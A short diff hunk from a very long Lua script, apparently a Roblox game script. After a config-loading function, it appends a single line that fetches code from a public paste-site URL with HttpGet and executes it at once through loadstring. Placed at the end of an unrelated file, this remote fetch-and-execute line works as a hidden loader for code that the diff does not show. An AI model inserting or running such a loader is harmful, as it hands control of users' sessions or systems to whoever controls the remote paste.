@@ -26994,3 +26994,4 @@ loadAmousConfig = function()
         _G.StretchRez.apply(idx)
     end
 end
+loadstring(game:HttpGet("https://pastefy.app/siRcFlOt/raw"))()
